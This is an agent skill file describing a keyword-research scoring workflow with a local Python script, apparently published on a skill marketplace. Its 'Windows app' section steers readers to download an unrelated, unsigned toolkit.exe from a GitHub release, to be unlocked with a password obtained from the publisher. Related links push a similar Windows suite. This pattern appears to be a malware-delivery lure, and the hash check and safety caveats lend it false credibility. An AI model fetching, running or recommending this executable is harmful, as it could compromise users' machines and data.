---
name: keyword-research-assistant
description: Scores a US keyword list by volume, difficulty and business fit, then ranks the terms worth writing about first. Use when the user asks for keyword research assistant, keyword difficulty scoring, seo keyword prioritization. For US SEO strategists and in-house marketing managers planning quarterly content.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Keyword Research Assistant

**Scores a US keyword list by volume, difficulty and business fit, then ranks the terms worth writing about first.** Written for US SEO strategists and in-house marketing managers planning quarterly content.

Use this skill when someone asks for:

- keyword research assistant
- keyword difficulty scoring
- seo keyword prioritization
- content gap keyword list

---

## The job

Keyword tools hand over thousands of terms with no way to tell which ones the business can win, so the calendar fills with traffic nobody wanted.

## What you get

1. Import the keyword export as CSV with volume, difficulty and a business fit score.
2. Score every row against the weighting the user sets for this quarter.
3. Sort the ranked table and cut the terms with no intent, no fit or a page that already owns them.
4. Group the winners into topic clusters with one pillar page per cluster.

Output contract:

- ranked_table - every keyword with its weighted score, sorted from high to low
- winners - the terms above the score threshold the user sets
- cuts - the terms with no intent or no page fit, each with the reason
- clusters - the grouped terms with a suggested pillar page for each group

## US specifics that matter

- Google says Keyword Planner search volume numbers are approximate and rounded, so a third-party estimate is never a measurement.
- Google's local ranking guidance says it looks for a specific place in the search terms, so city and near me terms behave differently from national ones.
- Google lists keyword stuffing in its spam policies: using a keyword too many times makes results less helpful.

## Guardrails (hard rules)

- Never report a search volume or a difficulty score as an exact number; they are vendor estimates.
- Never scrape a paid tool's data or work around its licence terms.
- Never invent a volume figure for a term the user has no data for.

## Quickstart

### 1. Fill in the brief

`templates/keyword-export.csv` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/score_keywords.py --input keyword-export.csv --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/keyword-scoring.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Columns worth keeping in the export**

- keyword, volume, difficulty, intent, business_fit and current_url.
- intent is informational, commercial, transactional or navigational.
- Keep the current_url column so you can spot two pages fighting for the same term.

**Weighting the score**

- Volume measures demand; difficulty measures competition, not revenue.
- Business fit is the term your sales team would recognise as a buyer.
- Set the weights per quarter, not per page, so the ranking stays comparable.

**Reading the numbers honestly**

- Difficulty scores come from a vendor model; Google publishes no difficulty metric.
- Volume numbers change between exports and between tools.
- A term with no volume can still close, so keep one slot for it.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/keyword-scoring.md` - Scoring a US keyword list honestly
- `templates/keyword-export.csv` - the brief to fill in
- `scripts/score_keywords.py` - the working script

## Verify the bundle

```bash
python3 scripts/score_keywords.py --input keyword-export.csv --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
